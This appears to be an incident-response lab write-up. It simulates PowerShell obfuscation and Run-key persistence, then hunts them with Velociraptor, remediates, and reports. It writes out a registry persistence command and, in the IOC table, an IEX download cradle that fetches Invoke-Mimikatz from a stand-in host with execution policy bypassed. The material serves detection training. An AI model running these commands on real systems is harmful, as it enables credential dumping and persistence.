# AWS-CRED-DUMP

## Step 1: Simulate the Incident
Open PowerShell as Administrator and run the following command:
> <br />*powershell -EncodedCommand aABpACAAJABFAE4AdgA6AFUAcwBlAHIA*

<br />This is a benign base64-encoded PowerShell command (hi $Env:User) that mimics obfuscation often used in real attacks.

You can also simulate a registry-related command:
>*Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "TestRunKey" -Value "cmd.exe"*

<br />This triggers Sysmon Event ID 13 for registry modifications—often seen in persistence mechanisms.

## Step 2: Run a Velociraptor Hunt
<br />From your SIFT server:

***Artifacts to Use:***
<br />*Windows.EventLogs.EvtxHunter*
<br />*Windows.EventLogs.Sysmon.ProcessCreation*
<br />*Windows.Triage.Sysmon*
<br />*Detection.Yara.Process (optional for rule matching)*

No filters needed yet. Let it return everything, or filter by:

<br />*Event ID = 1
<br />*CommandLine contains *EncodedCommand* or *Set-ItemProperty*

## **Step 3: Export the Results**
After 3–5 minutes:

Go to your Hunt Manager

Export the results:

Choose CSV Only or JSON Only

Transfer the file to your Windows machine using your PS HTTP method or another safe option

## Step 4: Analyze the IOCs
Use VS Code or Excel (if available) to search for these indicators:

Search Terms:
<br />" *EncodedCommand* "
<br />" *User* "
<br />" *'EventID': 13* "
<br />" *'EventID': 4104* "
<br />" *Credential* "
<br />" \\\REGISTRY\\\ "

You should see a process like:
> powershell.exe -EncodedCommand aABpACAAJABFAE4AdgA6AFUAcwBlAHIA
> 
<br /> or

>cmd.exe /c Set-ItemProperty ...
>
These mimic credential dumping or persistence behavior—common tactics in real attacks.

# Remediation

## Step 1. Remove Persistence 
Delete the malicious Run key:
> Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "TestRunKey"
## Step 2. Delete Dropped Scripts (if any)
If a payload was saved to disk, delete it.
>Remove-Item "C:\Path\To\invoke-mimikatz.ps1"
## Step 3. Change Credentials
Since credentials may have been dumped:


Change passwords for affected users (especially Administrator)

In a real case, force domain-wide password reset

## Step 4. Disable PowerShell Logging Bypass (optional hardening)
Enforce ExecutionPolicy via Group Policy.
Enable full PowerShell transcription logging.

## Step 5. Update & Patch
Apply any missing Windows security patches.
Run antivirus/malware scans to verify cleanup.
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
<br />
# Incident Report (*Optional*)
## <br />  Executive Summary
<br /> On June 17, 2025, suspicious PowerShell activity was detected on an EC2 Windows host. A review of logs confirmed the download and execution of a known credential dumping script (Invoke-Mimikatz). Registry persistence was also observed, indicating an attempt to maintain access. The incident was contained, and mitigation steps were implemented.
<br />

| IOC Type                    | Value / Description                                                                                     |
|----------------------------|-------------------------------------------------------------------------------------------------------|
| PowerShell Download         | IEX (New-Object Net.WebClient).DownloadString('http://example.com/invoke-mimikatz.ps1')                |
| Persistence                | HKU\...\CurrentVersion\Run\TestRunKey set to launch cmd.exe                                           |
| Registry Handle Leak        | EVENT_HIVE_LEAK from svchost.exe                                                                       |
| User                       | EC2AMAZ-OTMH1RS\Administrator                                                                          |
| Process                    | powershell.exe PID 3020                                                                                 |
| Timestamp                  | 2025-06-17 18:34:52 UTC                                                                                |
| Event ID                   | 4104 (PowerShell ScriptBlock Logging)                                                                  |
| Command                    | powershell -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString..." |
| Technique                  | T1059.001 – PowerShell<br>T1105 – Remote File Copy<br>T1003.001 – LSASS Memory                          |
| Significance               | Strong evidence of credential dumping via in-memory Mimikatz execution                                 |

<br />
<br />

## Analysis

<br />
Velociraptor logs showed Event ID 4104 containing a PowerShell ScriptBlock attempting to download invoke-mimikatz.ps1. This strongly indicates credential dumping activity. Additionally, Event ID 13 revealed registry RunKey modification used for persistence, and Event ID 1530 disclosed abnormal registry handle leaks, possibly indicative of memory access or mismanagement post-compromise.
<br />

## Remediation Steps
<br />1. Terminate Malicious Process:
- Identify PID (e.g., 3020 running powershell.exe)
- Kill process via Task Manager or PowerShell

<br />2. Delete Registry Persistence Key:
- Path: HKU\S-1-5-...\Run\TestRunKey
- Remove via reg delete or Registry Editor

<br />3. Block PowerShell Web Downloads:
- Group Policy or Defender ASR Rule to restrict *Invoke-WebRequest* or *Net.WebClient*

<br />4. YARA or Velociraptor Rule:
- Flag Event ID 4104 for downloads from http://*
- Monitor Registry changes to \Run\ keys

## Detection Enhancement

Custom artifact (*CredDumpDetection*) was created and uploaded to Velociraptor to monitor for future suspicious PowerShell and persistence activity. It queries for:
- Sysmon Event ID 13
- PowerShell Event ID 4104


